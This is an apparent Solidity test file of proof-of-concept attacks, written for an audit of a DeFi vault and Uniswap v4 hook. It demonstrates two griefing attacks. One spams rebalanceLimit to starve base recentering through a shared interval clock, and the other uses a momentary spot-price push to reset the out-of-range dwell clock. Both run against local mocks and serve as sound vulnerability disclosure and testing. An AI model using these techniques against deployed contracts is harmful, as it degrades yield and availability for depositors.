// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.26;

import {Deployers} from "@uniswap/v4-core/test/utils/Deployers.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";

import {FeraVault} from "../../src/FeraVault.sol";
import {FeraHook} from "../../src/FeraHook.sol";
import {FeraShare} from "../../src/shares/FeraShare.sol";
import {RevenueDistributor} from "../../src/RevenueDistributor.sol";
import {IFeraHook} from "../../src/interfaces/IFeraHook.sol";
import {IFeraVault} from "../../src/interfaces/IFeraVault.sol";
import {IRevenueDistributor} from "../../src/interfaces/IRevenueDistributor.sol";
import {IAnchorStaking} from "../../src/interfaces/IAnchorStaking.sol";
import {FeraTypes} from "../../src/libraries/FeraTypes.sol";
import {FeraConstants} from "../../src/libraries/FeraConstants.sol";
import {MockAggregatorV3} from "../utils/Mocks.sol";

import {Hooks} from "@uniswap/v4-core/src/libraries/Hooks.sol";
import {LPFeeLibrary} from "@uniswap/v4-core/src/libraries/LPFeeLibrary.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";

/// @notice LENS: PERMISSIONLESS-CALLER SAFETY (VAULT_STRATEGY_V3.md §6 / stage-1 item 6).
///         Two griefing/DoS PoCs on the now-permissionless rebalance surface. Neither steals funds
///         (INV-3/11/15/16 hold; the 1% execution and 3% IL bounds hold regardless of caller) — both
///         are availability/yield-degradation attacks the v3 permissionless-safety writeup does not
///         cover:
///           1. SHARED interval clock — a cheap `rebalanceLimit` (swap-free) resets the SAME
///              `lastRebalanceTs` slot the high-value `rebalanceBase` recenter reads, so an attacker
///              can starve base recentering indefinitely by front-running each interval boundary.
///           2. POKE dwell-clock reset via momentary spot manipulation — the idempotence writeup only
///              proves spam is a no-op WHILE STILL OOR; but `pokeOutOfRange` clears `oorSince` on a
///              raw-SPOT in-range read (no TWAP gate on the CLEAR path), so a same-tx in-range flicker
///              resets the dwell and pushes rebalanceBase eligibility strictly later.
contract PermissionlessRebalancePoC is Deployers {
    using StateLibrary for IPoolManager;

    FeraVault internal vault;
    FeraHook internal hook;
    RevenueDistributor internal rev;
    FeraShare internal shareImpl;
    MockAggregatorV3 internal feed;

    PoolKey internal memeKey;
    PoolId internal memeId;

    uint256 internal constant T0 = 10_000_000;
    uint256 internal constant COOLDOWN = 3_600;
    uint256 internal constant JIT = 1_800;

    function setUp() public {
        vm.warp(T0);
        deployFreshManagerAndRouters();
        deployMintAndApprove2Currencies();

        shareImpl = new FeraShare();
        rev = new RevenueDistributor(makeAddr("stakers"), makeAddr("treasury"), makeAddr("ops"));
        feed = new MockAggregatorV3(8);
        feed.set(1e8, block.timestamp);

        uint160 flags = uint160(
            Hooks.BEFORE_INITIALIZE_FLAG | Hooks.AFTER_ADD_LIQUIDITY_FLAG | Hooks.AFTER_REMOVE_LIQUIDITY_FLAG
                | Hooks.BEFORE_SWAP_FLAG | Hooks.AFTER_SWAP_FLAG | Hooks.AFTER_ADD_LIQUIDITY_RETURNS_DELTA_FLAG
                | Hooks.AFTER_REMOVE_LIQUIDITY_RETURNS_DELTA_FLAG
        );
        address hookAddr = address(flags | (uint160(0x4242) << 14));
        vault = new FeraVault(
            manager,
            IFeraHook(hookAddr),
            IRevenueDistributor(address(rev)),
            IAnchorStaking(address(0)),
            address(shareImpl),
            address(this),
            address(this)
        );
        deployCodeTo("FeraHook.sol:FeraHook", abi.encode(manager, address(vault)), hookAddr);
        hook = FeraHook(hookAddr);

        memeKey = PoolKey({
            currency0: currency0,
            currency1: currency1,
            fee: LPFeeLibrary.DYNAMIC_FEE_FLAG,
            tickSpacing: 60,
            hooks: IHooks(hookAddr)
        });

        vault.setAllowedQuoteAsset(Currency.unwrap(currency0), true);
        memeId = vault.createBaseLimitPool(
            memeKey, FeraTypes.Regime.MEME, address(0), SQRT_PRICE_1_1, true, "MEME-BL", "mBL"
        );

        MockERC20(Currency.unwrap(currency0)).approve(address(vault), type(uint256).max);
        MockERC20(Currency.unwrap(currency1)).approve(address(vault), type(uint256).max);
    }

    // ── helpers (mirror BaseLimitStrategy.t.sol) ─────────────────────────────────────────────
    function _seedMeme() internal {
        vault.deposit(memeId, 0, 1_000e18, 1_000e18, 0);
        vault.deposit(memeId, 1, 1_000e18, 1_000e18, 0);
        vm.warp(block.timestamp + COOLDOWN + JIT);
        _refreshTwap();
    }

    function _refreshTwap() internal {
        swap(memeKey, true, -1e15, "");
        swap(memeKey, false, -1e15, "");
    }

    function _pushToTick(int24 target) internal {
        (, int24 tick,,) = manager.getSlot0(memeId);
        bool up = target > tick;
        swapRouter.swap(
            memeKey,
            SwapParams({
                zeroForOne: !up,
                amountSpecified: -int256(5_000_000e18),
                sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(target)
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
    }

    // ══════════════════════════════════════════════════════════════════════════════════════════
    // FINDING 1 — SHARED INTERVAL CLOCK: a cheap swap-free `rebalanceLimit` resets the SAME
    // `lastRebalanceTs` that gates the high-value `rebalanceBase`. An attacker front-running each
    // interval boundary with `rebalanceLimit` starves base recentering: the honest `rebalanceBase`
    // reverts `RebalanceTooSoon` even though EVERY other gate (OOR / dwell / TWAP-confirm) is
    // satisfied — proving the interval clock, weaponised cross-function, is the sole blocker.
    // ══════════════════════════════════════════════════════════════════════════════════════════
    function test_F1_rebalanceLimitSpam_starvesRebalanceBase() public {
        address attacker = makeAddr("griefer");

        _seedMeme();
        // A genuine, sustained move takes the Active(1) base out of range.
        _pushToTick(2_200);
        assertTrue(vault.pokeOutOfRange(memeId, 1), "expected Active base OOR");
        uint64 armed = vault.outOfRangeSince(memeId, 1);
        assertGt(armed, 0, "OOR clock armed");

        // Let the move mature: dwell + TWAP window elapse, then refresh so the 30-min TWAP confirms.
        vm.warp(uint256(armed) + FeraConstants.REBALANCE_TWAP_WINDOW_SEC + 100);
        _refreshTwap();

        // At this instant an honest `rebalanceBase(1)` WOULD pass (OOR + dwell + TWAP all satisfied).
        // The attacker front-runs with a swap-free `rebalanceLimit(1)` — cheap, needs only the
        // interval + TWAP-sanity — which stamps `lastRebalanceTs = now`.
        vm.prank(attacker);
        vault.rebalanceLimit(memeId, 1);

        // `rebalanceLimit` did NOT clear the OOR clock (only poke/rebalanceBase do) — so dwell + TWAP
        // still hold. The ONLY thing now blocking the recenter is the shared interval clock the
        // attacker just reset. Proof: the revert is specifically RebalanceTooSoon.
        vm.expectRevert(IFeraVault.RebalanceTooSoon.selector);
        vault.rebalanceBase(memeId, 1, false);
        assertEq(vault.outOfRangeSince(memeId, 1), armed, "OOR clock untouched by limit spam (dwell still holds)");

        // Repeatable every interval: the base can be starved indefinitely at ~1 cheap tx / interval.
        for (uint256 i; i < 3; ++i) {
            vm.warp(block.timestamp + FeraConstants.MEME_MIN_REBALANCE_INTERVAL_SEC + 1);
            _refreshTwap();
            vm.prank(attacker);
            vault.rebalanceLimit(memeId, 1); // resets the shared clock again
            vm.expectRevert(IFeraVault.RebalanceTooSoon.selector);
            vault.rebalanceBase(memeId, 1, false); // base recenter perpetually starved
        }
        assertTrue(vault.pokeOutOfRange(memeId, 1), "base is STILL OOR - bulk capital never recentered");
    }

    // ══════════════════════════════════════════════════════════════════════════════════════════
    // FINDING 2 — POKE DWELL RESET VIA MOMENTARY SPOT: the idempotence writeup proves only that
    // spam is a no-op WHILE STILL OOR. But `pokeOutOfRange` clears `oorSince` whenever `_baseOutOfRange`
    // reads spot IN-range — and that read is RAW SPOT with NO TWAP gate (unlike rebalanceBase's
    // TWAP-confirmed ARM path). An attacker momentarily pushes spot back into the base band, pokes
    // (clock -> 0), then lets spot return OOR; a re-poke re-arms at a LATER timestamp, pushing
    // rebalanceBase eligibility strictly later than the FIRST genuine breach. Contrast the existing
    // `test_pokeOutOfRange_idempotent_spamCannotDelayEligibility`, which never leaves the OOR state.
    // ══════════════════════════════════════════════════════════════════════════════════════════
    function test_F2_pokeDwellReset_viaMomentarySpot_delaysEligibility() public {
        _seedMeme();
        _pushToTick(2_200); // Active(1) base OOR
        assertTrue(vault.pokeOutOfRange(memeId, 1), "expected OOR");
        uint64 firstArm = vault.outOfRangeSince(memeId, 1);
        assertGt(firstArm, 0, "armed at first genuine breach");

        // Advance to ONE SECOND short of dwell expiry — rebalanceBase is about to become eligible.
        vm.warp(uint256(firstArm) + FeraConstants.MEME_OOR_DWELL_SEC - 1);

        // ---- The attack (bundled atomically in a real attack; the price round-trip near the band
        //      edge is the only cost). Step A: momentarily move spot back INTO the base band.
        _pushToTick(0);
        // Step B: poke while spot is in-range -> `oorSince` is CLEARED to 0 (no TWAP gate here).
        assertFalse(vault.pokeOutOfRange(memeId, 1), "in-range poke should report not-OOR");
        assertEq(vault.outOfRangeSince(memeId, 1), 0, "DWELL CLOCK WAS RESET by a raw-spot in-range poke");
        // Step C: let spot return OOR (genuine market pressure / attacker un-does the round trip).
        _pushToTick(2_200);

        // A re-poke now re-arms at the CURRENT (much later) timestamp — eligibility pushed forward.
        assertTrue(vault.pokeOutOfRange(memeId, 1), "re-armed after spot returned OOR");
        uint64 reArm = vault.outOfRangeSince(memeId, 1);
        assertGt(reArm, firstArm, "re-arm is strictly LATER than the first genuine breach (eligibility delayed)");

        // Concretely: even though the FIRST breach was long enough ago to satisfy dwell, the recenter
        // is now blocked because the clock was reset — the exact property the idempotence claim says
        // an attacker cannot affect ("cannot change WHEN rebalanceBase's dwell gate is satisfied
        // relative to the FIRST genuine breach").
        vm.expectRevert(IFeraVault.OorNotPersistent.selector);
        vault.rebalanceBase(memeId, 1, false);
    }
}
